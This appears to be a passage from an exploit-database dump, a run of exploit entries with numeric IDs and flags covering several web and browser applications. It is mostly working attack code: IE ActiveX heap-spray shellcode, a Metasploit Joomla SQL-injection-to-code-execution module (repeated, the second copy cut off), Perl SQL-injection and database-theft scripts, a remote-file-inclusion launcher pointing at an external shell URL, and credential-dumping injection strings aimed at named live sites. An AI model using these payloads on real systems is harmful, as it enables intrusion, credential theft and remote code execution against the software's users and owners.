http://server/[path]/obj/collectivite.class.php?path_om=[Shell] http://server/[path]/obj/droit.class.php?path_om=[Shell] http://server/[path]/obj/tache.class.php?path_om=[Shell] http://server/[path]/obj/emetteur.class.php?path_om=[Shell] http://server/[path]/obj/utilisateur.class.php?path_om=[Shell] http://server/[path]/obj/courrier.recherche.tab.class.php?path_om=[Shell] http://server/[path]/obj/profil.class.php?path_om=[Shell]  [~] LFI: http://server/[path]/scr/soustab.php?dsn[phptype]=[LFI%00]   # Inj3ct0r.com [2010-04-26]",Opencourrier,0
4932,"Digital Data Communications - 'RtspVaPgCtrl' Class Remote Buffer Overflow <!-- Digital Data Communications RtspVaPgCtrl Class (RtspVapgDecoder.dll 1.1.0.29) remote buffer overflow (ie7/xp sp2)  You may ask why I'm interested in theese untested/unpatched codecs, oh, well, I'm preparing a live scanner for clsid's, I mean not a fuzzer a framework which *choose* which control to exploit to see what happen, not blinding attack a common one. Even attackers have imagination,   you know this?   Someone should kill-bit theese codecs by os update and let you really choose which site can use them... this sound strange, or someone needs a backdoor always opened on IE? Oh, don't worry,  joy and firewall bypass to the world.   a site where you can find it: http://www.level1.com.au/demo.php my codebase: http://level1demo.dyndns.org:1030/RtspVaPgDec.cab  rgod - stay tuned with us ... http://retrogod.altervista.org/join.html security feeds, radio streams, techno/drum & bass stations to come --> <html> <object classid='clsid:361E6B79-4A69-4376-B0F2-3D1EBEE9D7E2' id='RtspVaPgCtrl' /></object> <script language=""javascript""> ///add su one, user: sun pass: tzu shellcode = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u3749%u4949"" +                      ""%u4949%u4949%u4949%u4949%u4949%u4949%u5a51%u456a"" +                      ""%u5058%u4230%u4231%u6b41%u4141%u3255%u4241%u3241"" +                      ""%u4142%u4230%u5841%u3850%u4241%u6d75%u6b39%u494c"" +                      ""%u5078%u3344%u6530%u7550%u4e50%u716b%u6555%u6c6c"" +                      ""%u614b%u676c%u3175%u6568%u5a51%u4e4f%u306b%u564f"" +                      ""%u4c78%u414b%u774f%u4450%u4841%u576b%u4c39%u664b"" +                      ""%u4c54%u444b%u7841%u466e%u6951%u4f50%u6c69%u6b6c"" +                      ""%u6f34%u3330%u6344%u6f37%u6a31%u646a%u474d%u4871"" +                      ""%u7842%u4c6b%u6534%u716b%u5144%u6334%u7434%u5835"" +                      ""%u6e65%u736b%u646f%u7364%u5831%u756b%u4c36%u644b"" +                      ""%u624c%u6c6b%u634b%u656f%u574c%u7871%u4c6b%u774b"" +                      ""%u4c6c%u464b%u7861%u4f6b%u7379%u516c%u3334%u6b34"" +                      ""%u7073%u4931%u7550%u4e34%u536b%u3470%u4b70%u4f35"" +                      ""%u7030%u4478%u4c4c%u414b%u5450%u4c4c%u624b%u6550"" +                      ""%u6c4c%u6e6d%u626b%u6548%u6858%u336b%u6c39%u4f4b"" +                      ""%u4e70%u5350%u3530%u4350%u6c30%u704b%u3568%u636c"" +                      ""%u366f%u4b51%u5146%u7170%u4d46%u5a59%u6c58%u5943"" +                      ""%u6350%u364b%u4230%u7848%u686f%u694e%u3170%u3370"" +                      ""%u4d58%u6b48%u6e4e%u346a%u464e%u3937%u396f%u7377"" +                      ""%u7053%u426d%u6444%u756e%u5235%u3058%u6165%u4630"" +                      ""%u654f%u3133%u7030%u706e%u3265%u7554%u7170%u7265"" +                      ""%u5353%u7055%u5172%u5030%u4273%u3055%u616e%u4330"" +                      ""%u7244%u515a%u5165%u5430%u526f%u5161%u3354%u3574"" +                      ""%u7170%u5736%u4756%u7050%u306e%u7465%u4134%u7030"" +                      ""%u706c%u316f%u7273%u6241%u614c%u4377%u6242%u524f"" +                      ""%u3055%u6770%u3350%u7071%u3064%u516d%u4279%u324e"" +                      ""%u7049%u5373%u5244%u4152%u3371%u3044%u536f%u4242"" +                      ""%u6153%u5230%u4453%u5035%u756e%u3470%u506f%u6741"" +                      ""%u7734%u4734%u4570""); bigblock  = unescape(""%00%09%09%00"");//do not touch this headersize = 20; slackspace = headersize+shellcode.length; while (bigblock.length<slackspace) bigblock+=bigblock; fillblock = bigblock.substring(0, slackspace); block = bigblock.substring(0, bigblock.length-slackspace); while(block.length+slackspace<0x40000) block = block+block+fillblock; memory = new Array(); for (i=0;i<400;i++){memory[i] = block+shellcode} puf=""""; for (i=0;i<55;i++){puf = puf + unescape(""%0d%0d%0d%0d"")}//overwriting esi RtspVaPgCtrl.MP4Prefix = puf; </script> </html>  # milw0rm.com [2008-01-17]",.level1.,0
6043,"Core Image Fun House 2.0 (OSX) - Arbitrary Code Execution (PoC) #!/usr/bin/ruby # Copyright (c) Netragard, LLC. adriel@netragard.com # # /Developer/Applications/Graphics Tools/Core Image Fun House.app # /Contents/MacOS/Core Image Fun House # # (gdb) x/10s 0xbfffddf7 # 0xbfffddf7:      'Z' <repeats 101 times>, ""DCBA center"" # # 2007-07-10 21:15:34.573 Core Image Fun House[1061] CFLog (0): #        CFPropertyListCreateFromXMLData(): plist parse failed; #        the data is notproper UTF-8. The file name for this data #        could be: $ #        /Users/test/Desktop/SuperTastey.funhouse/file.xml #        The parser will retry as in 10.2, but the problem should be #         corrected in the plist. # #  \x80-\xFF range that do not form proper utf8  len = 300 fname = ""SuperTastey"" retaddr = 0x0d0d0d0d  # There are lots of filtered chars!  if File.exist?(fname + "".funhouse/file.xml"")     File.unlink(fname + "".funhouse/file.xml"")     Dir.rmdir(fname + "".funhouse"") end Dir.mkdir(fname + "".funhouse"")  FUNSTUFF = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>"" + ""<!DOCTYPE plist PUBLIC \""-//Apple Computer//DTD PLIST 1.0//EN\"" \""http://www.apple.com/DTDs/PropertyList-1.0.dtd\"">"" + ""<plist version=\""1.0\"">"" + ""<dict>"" + ""<key>layers</key>"" + ""<array>"" + ""<dict>"" + ""<key>file</key>"" + ""<string>"" + ""Z"" * len + [retaddr].pack(""V"") + ""</string>"" + ""<key>offsetX</key>"" + ""<real>0.0</real>"" + ""<key>offsetY</key>"" + ""<real>0.0</real>"" + ""<key>type</key>"" + ""<string>image</string>"" + ""</dict>"" + ""<dict>"" + ""<key>classname</key>"" + ""<string>CIGlassDistortion</string>"" + ""<key>type</key>"" + ""<string>filter</string>"" + ""<key>values</key>"" + ""<dict>"" + ""<key>inputCenter_CIVectorValue</key>"" + ""<string>[150 150]</string>"" + ""<key>inputScale</key>"" + ""<real>200</real>"" + ""<key>inputTexture</key>"" + ""<string>"" + ""Z"" * 50000 + ""</string>"" + ""</dict>"" + ""</dict>"" + ""</array>"" + ""</dict>"" + ""</plist>"" + ""\n""  target_file = File.open(""SuperTastey.funhouse/file.xml"", ""w+"") { |f| ~  f.print(FUNSTUFF)  # weeeeee... lets have fun. ~  f.close }   # milw0rm.com [2008-07-11]",Core,0
38797,"Joomla! 3.4.4 Component Content History - SQL Injection / Remote Code Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info={})     super(update_info(info,       'Name'           => ""Joomla Content History SQLi Remote Code Execution"",       'Description'    => %q{         This module exploits a SQL injection vulnerability found in Joomla versions         3.2 up to 3.4.4. The vulnerability exists in the Content History administrator         component in the core of Joomla. Triggering the SQL injection makes it possible         to retrieve active Super User sessions. The cookie can be used to login to the         Joomla administrator backend. By creating a new template file containing our         payload, remote code execution is made possible.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Asaf Orpani', # Vulnerability discovery           'xistence <xistence[at]0x90.nl>' # Metasploit module         ],       'References'     =>         [           [ 'CVE', '2015-7857' ], # Admin session hijacking           [ 'CVE', '2015-7297' ], # SQLi           [ 'CVE', '2015-7857' ], # SQLi           [ 'CVE', '2015-7858' ], # SQLi           [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/' ],           [ 'URL', 'http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html' ]         ],       'Payload'        =>         {           'DisableNops' => true,           # Arbitrary big number. The payload gets sent as POST data, so           # really it's unlimited           'Space'       => 262144, # 256k         },       'Platform'       => ['php'],       'Arch'           => ARCH_PHP,       'Targets'        =>         [           [ 'Joomla 3.x <= 3.4.4', {} ]         ],       'Privileged'     => false,       'DisclosureDate' => ""Oct 23 2015"",       'DefaultTarget'  => 0))        register_options(         [           OptString.new('TARGETURI', [true, 'The base path to Joomla', '/'])         ], self.class)    end    def check      # Request using a non-existing table     res = sqli(rand_text_alphanumeric(rand(10)+6))      if res && res.body =~ /`(.*)_ucm_history`/       return Exploit::CheckCode::Vulnerable     end     return Exploit::CheckCode::Safe    end     def sqli( tableprefix )      # SQLi will only grab Super User sessions with a valid username and userid (else they are not logged in).     # The extra search for NOT LIKE '%IS NOT NULL%' is because of our SQL data that's inserted in the session cookie history.     # This way we make sure that's excluded and we only get real admin sessions.      sql = "" (select 1 FROM(select count(*),concat((select (select concat(session_id)) FROM #{tableprefix}session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)""      # Retrieve cookies     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php""),       'vars_get' => {         'option' => 'com_contenthistory',         'view' => 'history',         'list[ordering]' => '',         'item_id' => '1',         'type_id' => '1',         'list[select]' => sql         }       })      return res    end     def exploit      # Request using a non-existing table first, to retrieve the table prefix     res = sqli(rand_text_alphanumeric(rand(10)+6))      if res && res.code == 500 && res.body =~ /`(.*)_ucm_history`/       table_prefix = $1       print_status(""#{peer} - Retrieved table prefix [ #{table_prefix} ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Error retrieving table prefix"")     end      # Retrieve the admin session using our retrieved table prefix     res = sqli(""#{table_prefix}_"")      if res && res.code == 500 && res.body =~ /Duplicate entry &#039;([a-z0-9]+)&#039; for key/       auth_cookie_part = $1[0...-1]       print_status(""#{peer} - Retrieved admin cookie [ #{auth_cookie_part} ]"")     else       fail_with(Failure::Unknown, ""#{peer}: No logged-in admin user found!"")     end      # Retrieve cookies     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php"")     })      if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/       cookie_begin = $1       print_status(""#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Error retrieving unauthenticated cookie"")     end      # Modify cookie to authenticated admin     auth_cookie = cookie_begin     auth_cookie << ""=""     auth_cookie << auth_cookie_part     auth_cookie << "";""      # Authenticated session     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie       })      if res && res.code == 200 && res.body =~ /Administration - Control Panel/       print_status(""#{peer} - Successfully authenticated as Administrator"")     else       fail_with(Failure::Unknown, ""#{peer} - Session failure"")     end       # Retrieve template view     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'view' => 'templates'         }       })      # We try to retrieve and store the first template found     if res && res.code == 200 && res.body =~ /\/administrator\/index.php\?option=com_templates&view=template&id=([0-9]+)&file=([a-zA-Z0-9=]+)/       template_id = $1       file_id = $2     else       fail_with(Failure::Unknown, ""Unable to retrieve template"")     end      filename = rand_text_alphanumeric(rand(10)+6)      # Create file     print_status(""#{peer} - Creating file [ #{filename}.php ]"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'task' => 'template.createFile',         'id' => template_id,         'file' => file_id,         },       'vars_post' => {         'type' => 'php',         'name' => filename       }       })      # Grab token     if res && res.code == 303 && res.headers['Location']       location = res.headers['Location']       print_status(""#{peer} - Following redirect to [ #{location} ]"")       res = send_request_cgi(         'uri'    => location,         'method' => 'GET',         'cookie' => auth_cookie       )        # Retrieving template token       if res && res.code == 200 && res.body =~ /&([a-z0-9]+)=1\"">/         token = $1         print_status(""#{peer} - Token [ #{token} ] retrieved"")       else         fail_with(Failure::Unknown, ""#{peer} - Retrieving token failed"")       end        if res && res.code == 200 && res.body =~ /(\/templates\/.*\/)template_preview.png/         template_path = $1         print_status(""#{peer} - Template path [ #{template_path} ] retrieved"")       else         fail_with(Failure::Unknown, ""#{peer} - Unable to retrieve template path"")       end      else       fail_with(Failure::Unknown, ""#{peer} - Creating file failed"")     end      filename_base64 = Rex::Text.encode_base64(""/#{filename}.php"")      # Inject payload data into file     print_status(""#{peer} - Insert payload into file [ #{filename}.php ]"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'view' => 'template',         'id' => template_id,         'file' => filename_base64,         },       'vars_post' => {         'jform[source]' => payload.encoded,         'task' => 'template.apply',         token => '1',         'jform[extension_id]' => template_id,         'jform[filename]' => ""/#{filename}.php""       }       })      if res && res.code == 303 && res.headers['Location'] =~ /\/administrator\/index.php\?option=com_templates&view=template&id=#{template_id}&file=/       print_status(""#{peer} - Payload data inserted into [ #{filename}.php ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Could not insert payload into file [ #{filename}.php ]"")     end      # Request payload     register_files_for_cleanup(""#{filename}.php"")     print_status(""#{peer} - Executing payload"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, template_path, ""#{filename}.php""),       'cookie'  => auth_cookie     })    end  end",.tr,0
8418,"ASP Product Catalog 1.0 - Cross-Site Scripting / File Disclosure #!/usr/bin/perl # By AlpHaNiX [NullArea.Net] # alpha[at]hacker.bz # Made in Tunisia ########### # script : ASP Product Catalog Multiple Remote Exploits # download : http://sourceforge.net/project/showfiles.php?group_id=136315 # script homepage : http://aspprocatalog.sourceforge.net/ ########### # Vulnerable : # XSS : In Search , # Example : # http://h.1asphost.com/humayuns/aspProductCatalog/search.asp?keywords=""><script>alert(1)</script> # Database Disclosure # Path : database/aspProductCatalog.mdb ########## # Real Life Example : XSS # OOO  OOO           OO    OO        OO #  OO   O             O     O         O #  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO #  O  O O   O   O     O     O        OOO    OO     OOOOOO       O #  O   OO   O   O     O     O       O   O   O      O       OOOOOO # OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO # # #[-] ASP Product Catalog Multiple Remote Exploits #[-] Found & Exploited By AlpHaNiX # # #[!] Exploiting http://h.1asphost.com/humayuns/aspProductCatalog// .... #[!] http://h.1asphost.com/humayuns/aspProductCatalog/ Exploited ! #[!] http://h.1asphost.com/humayuns/aspProductCatalog/search.asp?keywords=""><script>alert(1)</script> ########## # Real Life Example : Database Disclosure # OOO  OOO           OO    OO        OO #  OO   O             O     O         O #  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO #  O  O O   O   O     O     O        OOO    OO     OOOOOO       O #  O   OO   O   O     O     O       O   O   O      O       OOOOOO # OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO # # #[-] ASP Product Catalog Multiple Remote Exploits #[-] Found & Exploited By AlpHaNiX # # #[!] Exploiting http://h.1asphost.com/humayuns/aspProductCatalog// .... #[!] http://h.1asphost.com/humayuns/aspProductCatalog/ Exploited ! database saved to c:/db.mdb ########## # Greetz for Zigma/Djek/unary/r1z  use lwp::UserAgent;  system('cls'); system('title ASP Product Catalog Multiple Remote Exploits'); system('color 2'); if (!defined($ARGV[0] && $ARGV[1])) {print ""[!] Usage : \n    ./exploit http://site.com -DD\n    ./exploit http://site.com -XSS\n"";exit();} if ($ARGV[0] =~ /http:\/\// ) { $site = $ARGV[0].""/""; } else { $site = ""http://"".$ARGV[0].""/""; } my @array; print ""\n\n\n\n OOO  OOO           OO    OO        OO\n"" ; print ""  OO   O             O     O         O\n"" ; print ""  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO\n"" ; print ""  O  O O   O   O     O     O        OOO    OO     OOOOOO       O\n"" ; print ""  O   OO   O   O     O     O       O   O   O      O       OOOOOO\n"" ; print "" OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO\n"" ; print ""\n\n[-] ASP Product Catalog Multiple Remote Exploits\n""; print ""[-] Found & Exploited By AlpHaNiX \n\n\n""; print ""[!] Exploiting $site ....\n""; my $bug        = $ARGV[1] ; my $site       = $ARGV[0] ; my $targetdd   = $site.""database/aspProductCatalog.mdb"" ;  if ($bug eq '-DD') {      my $useragent = LWP::UserAgent->new(agent => ""Mozilla 5.5"");      my $request   = $useragent->get($targetdd,"":content_file"" => ""c:/db.mdb"");          if ($request->is_success)              {                  print ""[!] $site Exploited ! database saved to c:/db.mdb\n"";              }          else {print ""[!] Exploiting $site Failed !\n[!] "".$request->status_line.""\n"";exit();} }   elsif ($bug eq '-XSS') {      my $useragent = LWP::UserAgent->new(agent => ""Mozilla 5.5"");      my $request   = $useragent->get(""$site"".""search.asp?keywords=ALPHANIXNULLAREA"");          if ($request->is_success)              {                  if ($request->content =~ m/ALPHANIXNULLAREA/i){print ""[!] $site Exploited !\n[!] $site"".""search.asp?keywords=\""><script>alert(1)<\/script>\n"";}                  else {print ""[!] Exploiting $site Failed !\n"";}              }          else {print ""[!] Exploiting $site Failed !\n[!] "".$request->status_line.""\n"";exit();}   }  else { print ""[!] Please Choose a valid flag -DD for database disclosure & -XSS For Cross Site Scripting\n""; exit(); }  # milw0rm.com [2009-04-13]",ASP,1
3592,"Web Content System 2.7.1 - Remote File Inclusion <html> <head> <meta http-equiv=""Content-Type"" content=""text/html; charset=windows-1254""> <title>Web Content System <<< v2.7.1 Remote File Include Exploit</title>  <script language=""JavaScript"">  //'=============================================================================================== //'[Script Name    : Web Content System <<< v2.7.1 Remote File Include Exploit Remote File Include Exploit //'[Coded by       : KEZZAP66345 //'[Author         : KEZZAP66345 //'[Contact        : kezzap66345@hotmail.com //'[Dork           : :( //'[download.Page  : http://aysad.net/download/?id=AySystemWCS27stable //'[S.Page         : http://aysad.net/ //'===============================================================================================  //'[[ERROR]]]------------------------------------------------------ //'.... //'.. //'<? //' //'<?include($path[""JavascriptEdit""]);?> //' //'?> //'.... //'.. //'[[ERROR]]]---------------------------------------------------------  //# kezzap66345.Turkey //# ...         //Basic exploit,but any time : (    var path=""/manage/javascript/""    var adres=""/formjavascript.php?"" //dosya ad.    var acik =""path[JavascriptEdit]="" // remote file include ;)    var shell=""http://freewebs.com/kezzap66345/1.php?"" // Shell Script     function command(){        if (document.rfi.target1.value==""""){           alert(""Failed.."");       return false;     }      rfi.action= document.rfi.target1.value+path+adres+acik+shell; //   rfi.submit(); // Form Submit    } </script>  </head>  <body bgcolor=""#000000""> <center>  <p><b><font face=""Verdana"" size=""2"" color=""white"">Web Content System v2.7.1 Remote File Include Exploit</font></b></p>  <p></p> <form method=""post"" target=""getting"" name=""rfi"" onSubmit=""command();"">     <b><font face=""Arial"" size=""2"" color=""#FF0000"">Target:</font><font face=""Arial"" size=""1"" color=""blue"">[http://[target]/[scriptpath]</font><font color=""RED"" size=""3"" face=""Arial"">   </font><font color=""#FF0000"" size=""2"">&nbsp;</font></b>   <input type=""text"" name=""target1"" size=""20"" style=""background-color: #808000"" onmouseover=""javascript:this.style.background='#808080';"" onmouseout=""javascript:this.style.background='#808000';""></p>   <p><input type=""submit"" value=""Sorgula"" name=""B1""><input type=""reset"" value=""Temizle"" name=""B2""></p> </form> <p><br> <iframe name=""getting"" height=""337"" width=""633"" scrolling=""yes"" frameborder=""0""></iframe> </p>  <b><font face=""Verdana"" size=""2"" color=""#008000"">KEZZAP66345</font></b></p> </center> </body> </html>  # milw0rm.com [2007-03-27]",Web,1
9647,"PHP-IPNMonitor - 'maincat_id' SQL Injection [+] [+] SQL injection vulnerability [+] PHP-IPNMonitor - sell digital downloads online [+] Download : http://www.withinweb.com/phpipnmonitor/ [+] noname[at]antisecurity.org   [+] Bugs = index.php?maincat_id=   [+] exploit = -null+union+select+concat(username,0x3a,userpassword)+from+ipn_tblpasswords--   [+] Example [+]        : http://localhost/[patch]/index.php?maincat_id=-null+union+select+concat(username,0x3a,userpassword)+from+ipn_tblpasswords--    [+] Demo  [+]        : http://www.beardsmith.com/ipnmonitor/index.php?maincat_id=-null+union+select+concat(username,0x3a,userpassword)+from+ipn_tblpasswords-- [+]	   : http://www.earrelaphant.com/ipnmonitor/cart/index.php?maincat_id=-null+union+select+concat(username,0x3a,userpassword)+from+ipn_tblpasswords--    [+] colek-colek  [+]             : Antisecurity[dot]Org www.MainHack.net www.ServerIsDown.org [+]               Jack-, Vrs_hCk, OoN_Boy, NoGe, zxvf, Yadoy666, s3t4n, r3v4n_b4st4rd, pizzyroot, em|nem, s4va, kecemplungkalen, xr00tb0y [+]               xshadow, Madonk, Tante Angela Chang, IrcMafia [+]               Indonesian Coder  [+]               Don Tukulesto, M3NW5, m364tr0n, cyb3r_tr0n [+] [+] crotz         [+]             : rm -rf malingsia    [+]  # milw0rm.com [2009-09-11]",.withinweb.,1
3625,"XOOPS Module Tiny Event 1.01 - 'id' SQL Injection #!/usr/bin/perl #[Script Name: XOOPS Module Tiny Event <= 1.01 (id) Remote BLIND SQL Injection Exploit #[Coded by   : ajann #[Author     : ajann #[Contact    : :( #[Dork       : inurl:/modules/tinyevent/ #[S.Page     : http://www.chapi.de/ #[$$         : ??  #[..         : ajann,Turkey   use IO::Socket; if(@ARGV < 1){ print "" [======================================================================== [//  XOOPS Module Tiny Event <= 1.01 (id) Remote BLIND SQL Injection Exploit [//                   Usage: exploit.pl [target] [//                   Example: exploit.pl victim.com [//                   Example: exploit.pl victim.com [//                           Vuln&Exp : ajann [======================================================================== ""; exit(); } #Local variables $kapan = ""/*""; $server = $ARGV[0]; $server =~ s/(http:\/\/)//eg; $host = ""http://"".$server; $port = ""80""; $file = ""/modules/tinyevent/index.php?op=show&id="";  print ""Script <DIR> : ""; $dir = <STDIN>; chop ($dir);  if ($dir =~ /exit/){ print ""-- Exploit Failed[You Are Exited] \n""; exit(); }  if ($dir =~ /\//){} else { print ""-- Exploit Failed[No DIR] \n""; exit();  }  print ""User ID (uid): ""; $id = <STDIN>; chop ($id);  $target = ""999999%20union%20select%201,2,3,4,concat(char(117,115,101,114,110,97,109,101,45,45),uname,char(112,97,115,115,119,111,114,100,45,45),pass)%20from%20xoops_users%20where%20uid%20like%20"".$id.$kapan; $target = $host.$dir.$file.$target;  #Writing data to socket print ""+**********************************************************************+\n""; print ""+ Trying to connect: $server\n""; $socket = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""$port"") || die ""\n+ Connection failed...\n""; print $socket ""GET $target HTTP/1.1\n""; print $socket ""Host: $server\n""; print $socket ""Accept: */*\n""; print $socket ""Connection: close\n\n""; print ""+ Connected!...\n""; #Getting while($answer = <$socket>) { if ($answer =~ /username--(.*?)pass/){ print ""+ Exploit succeed! Getting admin information.\n""; print ""+ ---------------- +\n""; print ""+ Username: $1\n""; }  if ($answer =~ /password--(.*?)<\/td>/){ print ""+ Password: $1\n""; }  if ($answer =~ /Syntax error/) {  print ""+ Exploit Failed : ( \n""; print ""+**********************************************************************+\n""; exit();  }  if ($answer =~ /Internal Server Error/) { print ""+ Exploit Failed : (  \n""; print ""+**********************************************************************+\n""; exit();  }  }  # milw0rm.com [2007-04-01]",.chapi.de,0
38797,"Joomla! 3.4.4 Component Content History - SQL Injection / Remote Code Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info={})     super(update_info(info,       'Name'           => ""Joomla Content History SQLi Remote Code Execution"",       'Description'    => %q{         This module exploits a SQL injection vulnerability found in Joomla versions         3.2 up to 3.4.4. The vulnerability exists in the Content History administrator         component in the core of Joomla. Triggering the SQL injection makes it possible         to retrieve active Super User sessions. The cookie can be used to login to the         Joomla administrator backend. By creating a new template file containing our         payload, remote code execution is made possible.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Asaf Orpani', # Vulnerability discovery           'xistence <xistence[at]0x90.nl>' # Metasploit module         ],       'References'     =>         [           [ 'CVE', '2015-7857' ], # Admin session hijacking           [ 'CVE', '2015-7297' ], # SQLi           [ 'CVE', '2015-7857' ], # SQLi           [ 'CVE', '2015-7858' ], # SQLi           [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/' ],           [ 'URL', 'http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html' ]         ],       'Payload'        =>         {           'DisableNops' => true,           # Arbitrary big number. The payload gets sent as POST data, so           # really it's unlimited           'Space'       => 262144, # 256k         },       'Platform'       => ['php'],       'Arch'           => ARCH_PHP,       'Targets'        =>         [           [ 'Joomla 3.x <= 3.4.4', {} ]         ],       'Privileged'     => false,       'DisclosureDate' => ""Oct 23 2015"",       'DefaultTarget'  => 0))        register_options(         [           OptString.new('TARGETURI', [true, 'The base path to Joomla', '/'])         ], self.class)    end    def check      # Request using a non-existing table     res = sqli(rand_text_alphanumeric(rand(10)+6))      if res && res.body =~ /`(.*)_ucm_history`/       return Exploit::CheckCode::Vulnerable     end     return Exploit::CheckCode::Safe    end     def sqli( tableprefix )      # SQLi will only grab Super User sessions with a valid username and userid (else they are not logged in).     # The extra search for NOT LIKE '%IS NOT NULL%' is because of our SQL data that's inserted in the session cookie history.     # This way we make sure that's excluded and we only get real admin sessions.      sql = "" (select 1 FROM(select count(*),concat((select (select concat(session_id)) FROM #{tableprefix}session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)""      # Retrieve cookies     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php""),       'vars_get' => {         'option' => 'com_contenthistory',         'view' => 'history',         'list[ordering]' => '',         'item_id' => '1',         'type_id' => '1',         'list[select]' => sql         }       })      return res    end     def exploit      # Request using a non-existing table first, to retrieve the table prefix     res = sqli(rand_text_alphanumeric(rand(10)+6))      if res && res.code == 500 && res.body =~ /`(.*)_ucm_history`/       table_prefix = $1       print_status(""#{peer} - Retrieved table prefix [ #{table_prefix} ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Error retrieving table prefix"")     end      # Retrieve the admin session using our retrieved table prefix     res = sqli(""#{table_prefix}_"")      if res && res.code == 500 && res.body =~ /Duplicate entry &#039;([a-z0-9]+)&#039; for key/       auth_cookie_part = $1[0...-1]       print_status(""#{peer} - Retrieved admin cookie [ #{auth_cookie_part} ]"")     else       fail_with(Failure::Unknown, ""#{peer}: No logged-in admin user found!"")     end      # Retrieve cookies     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php"")     })      if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/       cookie_begin = $1       print_status(""#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Error retrieving unauthenticated cookie"")     end      # Modify cookie to authenticated admin     auth_cookie = cookie_begin     auth_cookie << ""=""     auth_cookie << auth_cookie_part     auth_cookie << "";""      # Authenticated session     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie       })      if res && res.code == 200 && res.body =~ /Administration - Control Panel/       print_status(""#{peer} - Successfully authenticated as Administrator"")     else       fail_with(Failure::Unknown, ""#{peer} - Session failure"")     end       # Retrieve template view     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'view' => 'templates'         }       })      # We try to retrieve and store the first template found     if res && res.code == 200 && res.body =~ /\/administrator\/index.php\?option=com_templates&view=template&id=([0-9]+)&file=([a-zA-Z0-9=]+)/       template_id = $1       file_id = $2     else       fail_with(Failure::Unknown, ""Unable to retrieve template"")     end      filename = rand_text_alphanumeric(rand(10)+6)      # Create file     print_status(""#{peer} - Creating file [ #{filename}.php ]"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'task' => 'template.createFile',         'id' => template_id,         'file' => file_id,         },       'vars_post' => {         'type' => 'php',         'name' => filename       }       })      # Grab token     if res && res.code == 303 && res.headers['Location']       location = res.headers['Location']       print_status(""#{peer} - Following redirect to [ #{location} ]"")       res = send_request_cgi(         'uri'    => location,         'method' => 'GET',         'cookie' => auth_cookie       )        # Retrieving template token       if res && res.code == 200 && res.body =~ /&([a-z0-9]+)=1\"">/         token = $1         print_status(""#{peer} - Token [ #{token} ] retrieved"")       else         fail_with(Failure::Unknown, ""#{peer} - Retrieving token failed"")       end        if res && res.code == 200 && res.body 